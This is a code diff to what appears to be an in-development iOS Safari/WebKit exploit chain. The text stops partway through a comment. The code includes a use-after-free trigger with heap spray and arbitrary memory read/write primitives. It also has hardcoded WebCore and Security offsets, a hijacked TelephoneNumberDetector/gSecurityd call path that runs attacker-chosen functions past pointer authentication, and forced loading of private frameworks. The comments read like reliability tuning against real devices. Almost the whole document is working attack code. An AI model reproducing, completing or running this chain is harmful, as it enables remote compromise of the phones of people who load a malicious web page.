@@ -538,43 +756,207 @@ async function wakeViaMapRedirect(path, tok) {
     p.write8(mr.borrowCF + structs.CFBundle_loadedFlag, 1n);
     const l1 = dyldLoadedCount();
     postMessage(`[mapredir] wake via ${path}: loaded ${l0}->${l1}`);
-    atexitPass();                                                   // keep the waiter registered for the next broadcast
+    atexitPass();   // benign pass after the sync (count==gen): the spare is running, no sleeper to wake
     return l1 !== l0;
 }
-// Ordered fresh-path queue (both stages draw from it; each fire must produce NEW images or we
-// advance). run-260719_120258 autopsy: the redirect itself WORKS (cf.loaded=1, bundle marked
-// loaded) but AppleCV3D was already resident -> zero new images. Ranked YES+likely-fresh queue
-// from extracted/atexit-wake-paths-wide.md (74 YES of 4191 images, reverse-importer screened).
-const WAKE_PATHS = [
-    '/System/Library/PrivateFrameworks/XGBoostFramework.framework/XGBoostFramework',           // worker1 wake: PROVEN to load+wake (CreateML family)
-    '/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI',                                // worker2 wake: DarkSword's proven framework -- DISTINCT family + fresh (never resident), so the two legs never reload the same or a bad framework
-    // Fallbacks only (keep the mapredir mechanism -- NSBundle-direct is CAS-hardened):
-    '/System/Library/PrivateFrameworks/TuriCore.framework/TuriCore',                            // same family as XGBoost (CreateML) -- deprioritized
-    '/System/Library/PrivateFrameworks/MacinTalk.framework/MacinTalk',                          // 3 inits, nothing links it
-    '/System/Library/PrivateFrameworks/ProVideo.framework/ProVideo',                            // 6 inits, CameraEffectsKit
-    '/System/Library/PrivateFrameworks/CorePhotogrammetry.framework/CorePhotogrammetry',        // 3 inits, CoreOC
-    '/System/Library/PrivateFrameworks/GPUCompiler.framework/Libraries/libGPUCompilerImpl.dylib', // RESIDENT on this vphone (fire = no new image, no wake)
-    '/System/Library/PrivateFrameworks/XOJIT.framework/XOJIT',                                  // failed to load
-    '/System/Library/PrivateFrameworks/ObjectUnderstanding.framework/ObjectUnderstanding',      // failed to load
-    '/System/Library/PrivateFrameworks/IntelligenceEngine.framework/IntelligenceEngine',        // failed to load
-    '/System/Library/PrivateFrameworks/CoreIndoor.framework/CoreIndoor',                        // failed to load
-    '/System/Library/PrivateFrameworks/DialogEngine.framework/DialogEngine',                    // failed to load
-    '/System/Library/PrivateFrameworks/AppleCV3D.framework/AppleCV3D',                          // resident on this vphone
-];
-// Direct per-worker wake frameworks (NO shared queue): each worker gets ONE proven, distinct,
-// fresh framework, fired ONCE at the 250k-spin mark. This avoids the WAKE_PATHS array burning the
-// 3-class AVSpeech pool on retries (every pool-spent fire loads nothing -> the gate never completes).
-// Both are proven to load+wake in WebContent via the mapredir mechanism (NOT NSBundle-direct).
-// worker2 wake: MacinTalk — 3 inits, NOTHING LINKS IT (never resident -> loads fresh; the
-// CorePhotogrammetry pick was already resident: fire produced 1547->1547, and the retry loop then
-// clobbered device memory — see the device-clobber guard at both fireWorkerWake call sites).
-// The 3-init tree shrinks the chain's [broadcast -> block return -> seed w2tok] window from ~90ms
-// (TuriCore, fire3.ips) to ~ms, so the seed lands before worker2's completion.
-const W1_WAKE_PATH = '/System/Library/PrivateFrameworks/XGBoostFramework.framework/XGBoostFramework'; // proven to load+wake (kept)
-const W2_WAKE_PATH = '/System/Library/PrivateFrameworks/MacinTalk.framework/MacinTalk';               // fresh + 3 inits (was TuriCore)
-async function fireWorkerWake(path, tok) {
-    postMessage(`[mapredir] worker wake: ${path}`);
-    return await wakeViaMapRedirect(path, tok);
+// TELEPHONE-GATE ARM (2026-08-02, real-device "SLOT NEVER INVOKED" fix): the tree builder only calls
+// TelephoneNumberDetector::find from processCharacterBufferForInBody when
+// Document::isTelephoneNumberParsingEnabled() (23B85 disasm 0x1a058cdac): [[doc+0x2d0]+0x2d2] bit3
+// (settings().telephoneNumberParsingEnabled()) AND [doc+0xe0c] bit0 (m_isTelephoneNumberParsingAllowed).
+// The preference is status:embedder, default FALSE (UnifiedWebPreferences.yaml
+// TelephoneNumberParsingEnabled): an embedder that does not opt in NEVER runs the scan, so the
+// planted slot is never called and the fcall sentinel survives -- exactly the real-device MARKER
+// TEST abort (vphone's embedder opts in; same 23B85, same offsets). Force both fields on every
+// HTMLDocument in allScriptExecutionContextsMap (same walk as stage3). Settings is shared per-Page
+// (one arm covers later-created documents); the allowed byte defaults 1 (no format-detection meta
+// on this page) and is forced anyway. quiet=true logs only failures (per-fcall re-arm).
+function armTelephoneGate(tag, quiet, write = true) {
+    try {
+        const tab = p.read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
+        if (!tab) { postMessage(`[gate] ${tag}: contexts table NULL`); return false; }
+        const len = p.read64(tab - 8n) >> 32n;
+        const seen = new Set();
+        const vtSeen = {};
+        let docs = 0, armed = 0;
+        for (let i = 0n; i < len; i++) {
+            const b = tab + i * structs.ContextsMap_stride;
+            if (!p.read64(b)) continue;                                  // empty bucket
+            const ctx = p.read64(b + structs.ContextsMap_value);
+            if (ctx < 0x100000000n || ctx > 0x10000000000n || seen.has(ctx)) continue;   // deleted(-1)/garbage bucket
+            seen.add(ctx);
+            const vt = noPAC(p.read64(ctx));
+            const vtU = hex(vt - p.slide); vtSeen[vtU] = (vtSeen[vtU] || 0) + 1;
+            if (vt !== offsets.WebCore__HTMLDocument_vtable) continue;
+            docs++;
+            const doc = ctx - structs.Document_secSubobjectOffset;   // map value = the SEC subobject (Document+0xd0)
+            const settings = p.read64(doc + structs.Document_settings);
+            // Settings is a runtime heap object (NOT cache-resident): accept the heap range too.
+            // (Real-device run 2026-08-02: settings=0x10b24c4a0 was wrongly rejected as implausible.)
+            if (!(settings > 0x100000000n && settings < 0x10000000000n) || (settings & 7n) !== 0n) { postMessage(`[gate] ${tag}: doc ${hex(doc)} settings implausible ${hex(settings)} -- skipped`); continue; }
+            const sByte = (p.read64(settings + structs.Settings_telephoneParsing - 2n) >> 16n) & 0xffn;
+            const aByte = (p.read64(doc + structs.Document_telephoneParsingAllowed - 4n) >> 32n) & 0xffn;
+            if (write) {
+                p.write8(settings + structs.Settings_telephoneParsing, sByte | 0x8n);
+                p.write8(doc + structs.Document_telephoneParsingAllowed, aByte | 1n);
+                armed++;
+            } else if ((sByte & 0x8n) && (aByte & 0x1n)) armed++;   // check mode: gate already open
+            if (!quiet || !write) postMessage(`[gate] ${tag}: doc ${hex(doc)} settings ${hex(settings)} byte ${hex(sByte)}${write ? `->${hex(sByte | 0x8n)}` : (sByte & 0x8n ? ' (parsing ENABLED)' : ' (PARSING OFF!)')} allowed ${hex(aByte)}${write ? `->${hex(aByte | 0x1n)}` : ''}`);
+        }
+        if (!docs) postMessage(`[gate] ${tag}: NO HTMLDocument in contexts map! vtables=${JSON.stringify(vtSeen)}`);
+        else if (!quiet && write) postMessage(`[gate] ${tag}: armed ${armed}/${docs} HTMLDocument(s)`);
+        return armed > 0;
+    } catch (e) { postMessage(`[gate] ${tag} ERR ${e && (e.message || e)}`); return false; }
+}
+async function setupFcall() {
+    if (p.fcallReady) return true;
+    const offsets = p.offsets;
+    slog('[sf] setupFcall entry');
+    p.reestablishRead64();
+    const paciza_invoker = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt);
+    const paciza_security_invoker_1 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage);
+    const paciza_security_invoker_2 = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage);
+    const paciza_dlopen = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation);
+    const paciza_dlsym = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata);
+    const paciza_signPointer = p.read64(offsets.ImageIO__gFunc_CMPhotoCompressionSessionAddExif);
+    slog('[sf] 6 globals read');
+    postMessage(`[fcall] setup: invoker=${hex(paciza_invoker)} sec1=${hex(paciza_security_invoker_1)} sec2=${hex(paciza_security_invoker_2)} dlopen=${hex(paciza_dlopen)} dlsym=${hex(paciza_dlsym)} sign=${hex(paciza_signPointer)}`);
+    // Unslide with the 39-bit noPAC mask, NOT 0xffffffffff (40-bit): arm64e addresses are 39-bit and
+    // the PAC signature spills into bit 39, which VARIES per run (random PAC key). The 40-bit mask
+    // caught that bit -> leakedExt=0x824cc2fb90 intermittently on the real device (want 0x24cc2fb90).
+    const leakedExtUnslid = noPAC(paciza_invoker) - p.slide;
+    if (leakedExtUnslid !== 0x24cc2fb90n) {
+        postMessage(`[fcall] setup FAILED: leakedExt(unslid)=${hex(leakedExtUnslid)} (want 0x24cc2fb90) -- carrier/interpose did not land; aborting attempt`);
+        return false;
+    }
+    p.paciza_invoker = paciza_invoker; p.paciza_security_invoker_1 = paciza_security_invoker_1;
+    p.paciza_security_invoker_2 = paciza_security_invoker_2; p.paciza_dlopen = paciza_dlopen;
+    p.paciza_dlsym = paciza_dlsym; p.paciza_signPointer = paciza_signPointer;
+    // Preserve the REAL securityd ops table (a zeroed table hangs Security's XPC -- §5j). The global
+    // holds a POINTER to the ops table; copy the table's real 0x20 ops (not the bss neighborhood).
+    // LAZY-INIT HANDLING (2026-07-21, crash 220615.ips): at stage5 Security.framework is usually
+    // NOT yet loaded, so gSecurityd reads 0 (the old flow reached setup at stage7, after the
+    // MacinTalk/HomeUI wake had loaded it) -- and the copy loop then read64(0)'d -> EXC_BAD_ACCESS
+    // at 0x0 in the chain worker. A 0 table is HARMLESS for the fcall: there are no securityd
+    // users to protect, the per-call swap plants OUR table right before each trigger (the blraaz
+    // always reads the global before the called pc runs), and any later Security init lands inside
+    // a called dlopen -- AFTER the blraaz. So: preserve only when a real table exists, and skip
+    // the restore when there was nothing to restore to (realGSecurityd stays 0n).
+    const gSecurityd = new BigUint64Array(0x100 / 8);
+    const gSecurityd_data_ptr = gSecurityd.data();
+    const ptrPlausible = (v) => v > 0x180000000n && v < 0x210000000n;
+    const realGSecurityd = p.read64(offsets.Security__gSecurityd);
+    slog(`[sf] realGSecurityd=${hex(realGSecurityd)}`);
+    if (ptrPlausible(realGSecurityd)) {
+        p.realGSecurityd = realGSecurityd;
+        for (let i = 0n; i < 0x20n; i++) gSecurityd[i] = p.read64(realGSecurityd + i * 8n);
+        slog('[sf] gSecurityd table copied');
+    } else {
+        p.realGSecurityd = 0n;   // Security not loaded: swap-only, no restore (see note above)
+        slog('[sf] gSecurityd=0 (Security not loaded) -- swap-only mode');
+    }
+    p.gSecurityd = gSecurityd; p.gSecurityd_data_ptr = gSecurityd_data_ptr;
+    const slowFcallResult = new BigUint64Array(0x10 / 8);
+    const slowFcallResult_data_ptr = slowFcallResult.data();
+    slowFcallResult[8 / 8] = slowFcallResult_data_ptr - 0x18n;
+    p.slowFcallResult = slowFcallResult;
+    const invoker_x0 = new BigUint64Array(0x58);
+    const invoker_x0_data_ptr = invoker_x0.data();
+    invoker_x0[0x20 / 8] = slowFcallResult_data_ptr;
+    invoker_x0[0x18 / 8] = invoker_x0_data_ptr;
+    p.invoker_x0 = invoker_x0;
+    // 26.1 FCALL TRIGGER (§5p): TelephoneNumberDetector::find -> slot(scannerObj) via blraaz; the
+    // fake scanner IS invoker_x0, the slot is gadget1/gadget2. gadget1 reads x0..x2 from
+    // [invoker_x0+0x28/0x30/0x38], blraaz gSecurityd[0x80]=pc, stores result at [[invoker_x0+0x20]].
+    p.write8(offsets.WebCore__TND_supportedFlag, 1n);
+    // ORDER (2026-08-02): set the scanner OBJECT before the once flag. If WebCore's scanner init
+    // checks "is the object already set?" it adopts ours instead of lazily building a real scanner
+    // on the first phone-number scan (real device: the scan ran but with a real scanner).
+    p.write64(offsets.WebCore__TND_scannerObject, invoker_x0_data_ptr);
+    p.write64(offsets.WebCore__TND_scannerOnce, 0xffffffffffffffffn);
+    // ALSO patch TelephoneNumberDetector's ACTUAL scanner value (0x1eb084030) -- the detector may
+    // read this global (not TND_scannerObject) for the scanner it passes to find(). Same fake.
+    p.write64(offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_x0_data_ptr);
+    // GATE ARM (2026-08-02): force settings().telephoneNumberParsingEnabled + the document's allowed
+    // byte on every HTMLDocument -- the embedder pref defaults FALSE, and without it the parser never
+    // calls find() at all (real-device SLOT NEVER INVOKED despite correct gadgets/plants).
+    armTelephoneGate('setup');
+    // Per-call gSecurityd swap + restore (minimizes the hijacked window -- fresh-framework dlopens
+    // do code-signature validation, so Security's XPC must see the real table outside each call).
+    // When realGSecurityd is 0n (Security not yet loaded at stage5, 2026-07-21) the swap still
+    // plants OUR table for the call, but the restore is SKIPPED -- there is no real table to
+    // restore to, and writing 0 could clobber a table a mid-call dlopen just initialized.
+    function slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
+        p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_security_invoker_1);
+        gSecurityd[0x80 / 8] = pc;
+        invoker_x0[0x28 / 8] = x0;
+        invoker_x0[0x30 / 8] = x1;
+        invoker_x0[0x38 / 8] = x2;
+        p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr);
+        const __g = p.read64(offsets.Security__gSecurityd);
+        postMessage(`[fcall] pc=${hex(pc)} ${__g === gSecurityd_data_ptr ? 'FAST' : 'XPC-FALLBACK!'}`);
+        // TND RE-ARM (2026-08-02): re-write the fake scanner + once right before the trigger. The
+        // real device's scan lazily initializes a REAL DataDetectors scanner on first use, so arm
+        // ours at the exact moment of the trigger (setupFcall's write may predate the init).
+        p.write8(offsets.WebCore__TND_supportedFlag, 1n);
+        p.write64(offsets.WebCore__TND_scannerObject, invoker_x0_data_ptr);
+        p.write64(offsets.WebCore__TND_scannerOnce, 0xffffffffffffffffn);
+        p.write64(offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_x0_data_ptr);
+        armTelephoneGate('rearm1', true);   // re-force the parsing-enabled gate at trigger time (quiet)
+        return new Promise(r => {
+            slow_fcall_resolve = (val) => { slow_fcall_resolve = null; if (p.realGSecurityd !== 0n) p.write64(offsets.Security__gSecurityd, p.realGSecurityd); r(val); };
+            // SENTINEL (2026-08-02): overwritten by the gadget iff it actually runs. If it survives,
+            // the detector scan never called the slot -> trigger issue, not a dlopen failure.
+            p.slowFcallResult[0] = 0xfeedfacecafebeefn;
+            self.postMessage({ type: 'slow_fcall' });
+            // POLL (2026-08-02, real device): the detector scan can run ASYNC after the page's write
+            // returns, so the gadget may write the result AFTER slow_fcall_done arrives (vphone writes
+            // it synchronously -> fast resolve). Poll the slot up to ~2s instead of resolving on the
+            // message alone. slow_fcall_done now only probes; this poll is the sole resolver.
+            let __p = 0;
+            const __iv = setInterval(() => {
+                const __v = p.slowFcallResult[0];
+                if (__v !== 0xfeedfacecafebeefn || ++__p > 400) {
+                    clearInterval(__iv);
+                    if (slow_fcall_resolve) slow_fcall_resolve(__v !== 0xfeedfacecafebeefn ? __v : 0xdeaddeadn);
+                }
+            }, 5);
+            setTimeout(() => { if (slow_fcall_resolve) slow_fcall_resolve(0xdeaddeadn); }, 3000);
+        });
+    }
+    function slow_fcall_2(pc, x0 = 0n, x1 = 0n, x2 = 0n, x3 = 0n, x4 = 0n, x5 = 0n) {
+        p.write64(offsets.WebCore__softLinkDDDFAScannerFirstResultInUnicharArray, paciza_security_invoker_2);
+        gSecurityd[0xc0 / 8] = pc;
+        invoker_x0[0x28 / 8] = x0; invoker_x0[0x30 / 8] = x1; invoker_x0[0x38 / 8] = x2;
+        invoker_x0[0x40 / 8] = x3; invoker_x0[0x48 / 8] = x4; invoker_x0[0x50 / 8] = x5;
+        p.write64(offsets.Security__gSecurityd, gSecurityd_data_ptr);
+        // TND RE-ARM (2026-08-02): same as slow_fcall_1 -- arm the fake scanner at trigger time.
+        p.write8(offsets.WebCore__TND_supportedFlag, 1n);
+        p.write64(offsets.WebCore__TND_scannerObject, invoker_x0_data_ptr);
+        p.write64(offsets.WebCore__TND_scannerOnce, 0xffffffffffffffffn);
+        p.write64(offsets.WebCore__TelephoneNumberDetector_phoneNumbersScanner_value, invoker_x0_data_ptr);
+        armTelephoneGate('rearm2', true);   // re-force the parsing-enabled gate at trigger time (quiet)
+        return new Promise(r => {
+            slow_fcall_resolve = (val) => { slow_fcall_resolve = null; if (p.realGSecurityd !== 0n) p.write64(offsets.Security__gSecurityd, p.realGSecurityd); r(val); };
+            p.slowFcallResult[0] = 0xfeedfacecafebeefn;
+            self.postMessage({ type: 'slow_fcall' });
+            let __p = 0;
+            const __iv = setInterval(() => {
+                const __v = p.slowFcallResult[0];
+                if (__v !== 0xfeedfacecafebeefn || ++__p > 400) {
+                    clearInterval(__iv);
+                    if (slow_fcall_resolve) slow_fcall_resolve(__v !== 0xfeedfacecafebeefn ? __v : 0xdeaddeadn);
+                }
+            }, 5);
+            setTimeout(() => { if (slow_fcall_resolve) slow_fcall_resolve(0xdeaddeadn); }, 3000);
+        });
+    }
+    function slow_dlopen(filename, flags) { const name = p.makeCString(filename); return slow_fcall_1(paciza_dlopen, name.ptr, flags); }
+    function slow_dlsym(handle, symbol) { const sym = p.makeCString(symbol); return slow_fcall_1(paciza_dlsym, handle, sym.ptr); }
+    p.slow_fcall_1 = slow_fcall_1; p.slow_fcall_2 = slow_fcall_2;
+    p.slow_dlopen = slow_dlopen; p.slow_dlsym = slow_dlsym;
+    p.fcallReady = true;
+    postMessage(`[fcall] setup READY (leakedExt unslid=${hex(leakedExtUnslid)}; realGSecurityd=${hex(realGSecurityd)})`);
+    return true;
 }
 
 
@@ -649,6 +1031,7 @@ const VERSIONS = {
             "ImageIO__gImageIOLogProc": 0x1ee39b008n,
             "libdyld__gAPIs": 0x1ed0b4010n,
             "libsystem_c__atexit_mutex": 0x1ed3f0b60n,
+            "libsystem_c__cxa_atexit": 0x18e920ba0n,   // [park-gate needle] worker1's parked stack contains __cxa_atexit+0x28 (lldb thread #5 frame #4) -- scan-for-park instead of the broken 26.1 count-poll
             "mach_task_self_ptr": 0x280a64078n,
             "mainRunLoop": 0x1ed7ac020n,
             "NSConcreteMapTable_countOff": 0x1ed42f2bcn, // ldrsw ivar-offset globals (layout from getKeys:values: disasm, bundleWithPath-and-round2.md)
@@ -660,6 +1043,9 @@ const VERSIONS = {
             "Security__gSecurityd": 0x1ea91d500n,
             "TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit": 0x1ed96f348n,
             "UIKitCore__OBJC_CLASS__UIManagedDocument": 0x1ee3f9980n, // wake target 1: +initialize -> dlopen(CoreData) direct, NO NSBundle/lock (deferred-loader-pairs.md (b2)); UIKitCore always in WebContent, CoreData not at boot
+            "CoreML__OBJC_CLASS___MLSNFrameworkHandle": 0x1ee57da68n, // wake target 0: -init -> dlopen(SoundAnalysis) direct in init (deferred-loader-pairs.md (c)); WebNN-only family = almost surely NOT resident on any device
+            "CoreML__OBJC_CLASS___MLVNFrameworkHandle": 0x1ee57d9a0n, // wake target 0b: -init -> dlopen(Vision) (deferred-loader-pairs.md (c))
+            "CoreML__OBJC_CLASS___MLNLPFrameworkHandle": 0x1ee57f4a8n, // wake target 0c: -init -> dlopen(NaturalLanguage) (deferred-loader-pairs.md (c))
             "WebCore__PAL_getPKContactClass": 0x1ed61cff8n,
             "WebCore__softLinkDDDFACacheCreateFromFramework": 0x1ed624310n,
             "WebCore__softLinkDDDFAScannerFirstResultInUnicharArray": 0x1ed6238b0n,
@@ -687,7 +1073,7 @@ const VERSIONS = {
             "WebCore__TND_scannerObject": 0x1eb083f78n,
             "WebCore__TND_scannerOnce": 0x1eb083f80n,
             "WebCore__TND_supportedFlag": 0x1eb083f10n,
-            "WebCore__HTMLDocument_vtable": 0x1f1376268n,
+            "WebCore__HTMLDocument_vtable": 0x1f1367550n, // RUNTIME-verified (real-device contexts walk 2026-08-02): ScriptExecutionContext-in-HTMLDocument SECONDARY address point (__ZTVN7WebCore12HTMLDocumentE 0x1f13671e0 + 0x370). The map stores the SEC subobject pointer (Document+0xd0; vtable offset-to-top at sym+0x360 = -0xd0), so ctx+0 holds this value, NOT the primary address point.
             "DesktopServicesPriv_bss": 0x1ecff4080n,
             "GetCurrentThreadTLSIndex_CurrentThreadIndex": 0x280c6e460n,
             "pthread_create_jsc": 0x1998f5688n,
@@ -733,6 +1119,11 @@ const VERSIONS = {
             // --- allScriptExecutionContextsMap walk (stage3) ---
             ContextsMap_stride: 0x30n,   // sizeof(HashMap bucket)
             ContextsMap_value: 0x20n,   // bucket -> ScriptExecutionContext*
+            // --- stage7 telephone-scan gate (Document::isTelephoneNumberParsingEnabled, 23B85 disasm 0x1a058cdac) ---
+            Document_settings: 0x2d0n,                 // Document.m_settings -> Settings*
+            Settings_telephoneParsing: 0x2d2n,         // Settings byte, bit 0x8 = telephoneNumberParsingEnabled (embedder pref, default FALSE)
+            Document_telephoneParsingAllowed: 0xe0cn,  // Document.m_isTelephoneNumberParsingAllowed byte, bit 0x1
+            Document_secSubobjectOffset: 0xd0n,        // contexts-map value = Document+0xd0 (the ScriptExecutionContext subobject); Document* = ctx - 0xd0
             // --- stage4: AXCoreUtilities DefaultLoader dispatch chain (Part A, disarm callback) ---
             //     [LIVE] validate via the defaultLoader/dispatchSource/dispatchBlock logs
             DefaultLoader_dispatchSource: 0x18n,
@@ -803,6 +1194,11 @@ const rootArray = new Array(0x40_0000).fill(1.1);
 const rootIndex = rootArray.length - 1;
 const reclaimed = [];
 
+// Per-buffer size of the UAF spray. Tunable: raising it trips JSC's collection threshold in
+// fewer iterations but overshoots harder (higher peak RSS -> Safari's memory-pressure tab
+// reload); lowering it costs iterations. Original value was 0x80_0000 (8MB).
+const UAF_SPRAY_UNIT = 0x10_0000;   // 1MB (was 0x80_0000 = 8MB)
+
 function triggerUAF(flag, k, allocCount) {
     const A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
     rootArray[rootIndex] = A;
@@ -811,8 +1207,17 @@ function triggerUAF(flag, k, allocCount) {
     const a = new Date(1111);
     a[0] = 1.1;
 
+    // SPRAY GRANULARITY (2026-08-01): was a hardcoded 0x80_0000 (8MB) per buffer. The buffers
+    // exist to push JSC's allocated-bytes counter over its collection threshold so the GC runs
+    // inside the race window -- the SIZE is a means to that, not a requirement. At 8MB the
+    // counter moves in huge steps, so each iteration overshoots by up to 40MB before the GC
+    // gets a decision point, and whatever has not been reclaimed when stage1 switches the GC
+    // off is pinned for the rest of the run. Measured peak footprint was ~597-776MB, and the
+    // resulting memory-pressure tab reload reaps 17 of 20 runs during stage6 (see
+    // reliability/FINDINGS.md). Same total pressure at finer granularity should trip the
+    // threshold at a lower peak.
     for (let j = 0; j < allocCount; ++j) {
-        forGC.push(new ArrayBuffer(0x80_0000));
+        forGC.push(new ArrayBuffer(UAF_SPRAY_UNIT));
     }
 
     A.p2 = forGC;
@@ -1040,7 +1445,7 @@ function buildScribbleRW(addrof, fakeobj) {
     p.write64 = write64;
     p.write8 = write8;
     p.write16 = write16;
-    
+
     p.write32le = (addr, v32) => {           // 32-bit store via two 16-bit writes — never touches the neighbor word
         v32 = BigInt(v32);
         p.write16(addr, v32 & 0xffffn);
@@ -1056,6 +1461,12 @@ function buildScribbleRW(addrof, fakeobj) {
     p.read64Str_addr = addrof(read64Str);
     p.read64BigUint64_addr = addrof(read64BigUint64);
     p.reestablishRead64 = function () {
+        // relink diagnostic slogs THROTTLED (2026-07-22): thousands of per-relink XHRs per attempt
+        // churned the worker+server right at the fire window (jetsam/WatchdogTimer reloads were
+        // the dominant attempt killer -- 78 fires / 22 CAS / 0 timeouts = killed mid-spin, not a
+        // mechanics failure). Log one in every 64 relinks; kill with p.relinkVerbose = false.
+        const __n = (p.__relinkN = (p.__relinkN || 0) + 1);
+        if ((__n & 0x3f) === 0) slog(`[relink] #${__n}`);
         changeScribble[1] = itof(p.read64BigUint64_addr + 8n);
         const rf = ftoi(scribbleElement[1]);
         read64BigUint64[0] = 0x10000000006n;
@@ -1483,7 +1894,7 @@ async function stage3() {
         //END GET TOKEN 
         const tag = id & 0xffffffffn;   // low 32 bits of the marker (int 0xffff0000.... or NaN-boxed 0xfffe0000....)
         const threadPort = portFromContext(context);
-                if (gs === p.addrof(globalThis)) {
+        if (gs === p.addrof(globalThis)) {
             p.myToken = threadPort;                      // the chain worker's own token
             postMessage(`[token] SELF=chain port=${hex(threadPort)}`);
         }
@@ -1493,16 +1904,24 @@ async function stage3() {
             if (seenCtx.has(ctxKey)) continue;   // skip the duplicate slot (else classes[] overwrite each other)
             seenCtx.add(ctxKey);
             p.dlopen_workers.push({ ctx: context, thread, threadPort, id, bitmap });
-        } else if (tag === 0x33333333n) {
-            p.sub_worker = { ctx: context, thread, threadPort, id };
+        } else if (tag === 0x33333333n || tag === 0x44444444n) {
+            // SPARE "fire workers": their close() runs the AVSpeech gate on their OWN thread for the
+            // wake fires. One per wake (0x33333333 = worker1's, 0x44444444 = worker2's) because a
+            // spare's bitmap is consumed by its first close() -- a spent spare can never re-fire.
+            const ctxKey = context.toString();
+            if (seenCtx.has(ctxKey)) continue;
+            seenCtx.add(ctxKey);
+            (p.spare_workers = p.spare_workers || []).push({ ctx: context, thread, threadPort, id });
         }
     }
     // Order deterministically by marker so p.dlopen_workers[0]=0x11111111 (close()'d in stage4),
     // [1]=0x22222222 (stage6). stage4 then plants classes[0]=TTSMagic (the class that triggers
     // AVLoadSpeech) into the worker that actually gets close()'d. Walk order is NOT stable.
     p.dlopen_workers.sort((a, b) => Number((a.id & 0xffffffffn) - (b.id & 0xffffffffn)));
+    if (p.spare_workers) p.spare_workers.sort((a, b) => Number((a.id & 0xffffffffn) - (b.id & 0xffffffffn)));
+    if (p.spare_workers && p.spare_workers.length) p.sub_worker = p.spare_workers[0];   // default spare = first (worker1's)
     p.mainToken = mainThreadPort();
-    postMessage(`[stage3] dlopen_workers=${p.dlopen_workers.length} order=[${p.dlopen_workers.map(w => hex(w.id & 0xffffffffn)).join(",")}] sub_worker=${p.sub_worker ? "yes" : "no"}`);
+    postMessage(`[stage3] dlopen_workers=${p.dlopen_workers.length} order=[${p.dlopen_workers.map(w => hex(w.id & 0xffffffffn)).join(",")}] spare_workers=${p.spare_workers ? p.spare_workers.length : 0} sub_worker=${p.sub_worker ? "yes" : "no"}`);
 }
 async function stage4() {
     postMessage(`[stage4] dlopen prepared from worker`);
@@ -1570,12 +1989,27 @@ async function stage4() {
     // contiguous 8-bit StringImpl, then JSString+8 -> StringImpl*, StringImpl+8 -> the char data.
     // This is DarkSword's proven robust path (no Uint8Array backing-store games, no addrof+0x10
     // fragility). Lets us hand CoreFoundation/dyld an attacker-controlled C string.
-    p.ropeResolver = p.ropeResolver || [];
+    // C-STRINGS WITHOUT ROPES (2026-07-22, the error-return root): the old rope-flatten trick
+    // (str+'\0' + delete -> contiguous StringImpl, JSString+8 -> StringImpl+8 -> data) only works
+    // for POINTER-BACKED StringImpls. On 26.1's JSC, SHORT strings (libARI's 21-char path!) are
+    // INLINE StringImpls: StringImpl+8 is the chars THEMSELVES, so the old code read the first 8
+    // characters ('/usr/lib') as a "pointer" -> garbage exec path -> libARI load fails ->
+    // worker1's block early-returns -> its dispatch_once completion brks on a walked token (the
+    // recurring vphone gate brks; the "etsy" SIGSEGV is the same deref on a longer inline string).
+    // This version writes the bytes into a fresh GC-pinned BigUint64Array with write64 --
+    // deterministic for every length, no StringImpl-layout dependence.
+    p.cstrBufs = p.cstrBufs || [];
     p.makeCString = (str) => {
-        str = str + '\0';
-        delete p.ropeResolver[str];                            // flatten the rope -> contiguous StringImpl
-        const name_ptr = p.read64(p.read64(p.addrof(str) + 8n) + 8n);   // JSString+8 -> StringImpl+8 -> data
-        return { ptr: name_ptr, len: BigInt(str.length - 1) };
+        const buf = new BigUint64Array(0x40);   // 512 bytes, GC-pinned below
+        p.cstrBufs.push(buf);
+        const data = buf.data();
+        const full = str + '\0';
+        for (let i = 0; i < full.length; i += 8) {
+            let q = 0n;
+            for (let j = 0; j < 8 && i + j < full.length; j++) q |= BigInt(full.charCodeAt(i + j)) << BigInt(8 * j);
+            p.write64(data + BigInt(i), q);
+        }
+        return { ptr: data, len: BigInt(str.length) };
     };
 
     p.rearmCFBundleLoader = (cstringOffset, cstringSize) => {
@@ -1644,6 +2078,35 @@ async function stage5() {
             }
         }
     };
+    // single-shot variant (no infinite retry) for the park-gate poll
+    p.search_once = function (begin, end, bytes) {
+        const needle = String.fromCharCode(...bytes);
+        const finder = p.create_jsstring(begin, end - begin);
+        const index = finder.indexOf(needle);
+        return index === -1 ? 0n : begin + BigInt(index);
+    };
+    // PARK-GATE (2026-07-23, root-caused via lldb): the stage4 count-poll NEVER confirms worker1's
+    // park ("NOT seen" every attempt -- 26.1 tracks waiters kernel-side, not in the userspace word),
+    // so the spare's drop raced worker1's TT load and usually landed BEFORE the park -> worker1
+    // missed the wake (the dominant "worker1 still parked" failure). worker1's parked stack provably
+    // contains __cxa_atexit+0x28 (lldb thread #5 frame #4, its return address out of the mutex
+    // acquire). Poll for that needle on worker1's stack and only let the choreography proceed to the
+    // fire once worker1 is confirmed parked at the atexit mutex. Bounded; on miss proceed anyway so
+    // the 00:33:11 fast-load case can't regress.
+    {
+        const __cxa = offsets.libsystem_c__cxa_atexit + 0x28n;
+        // LOW 5 BYTES: the stack holds the PAC-SIGNED LR (lldb: 0x1136000198ebcbc8 at worker1's
+        // frame record) -- the high 3 bytes are PAC, but bytes 0-4 are real address bits (byte4=0x01
+        // is address bit 32, below the VA cutoff, preserved through signing). 5 bytes kills the
+        // 4-byte collision risk while still ignoring the PAC field. An 8-byte needle never matches.
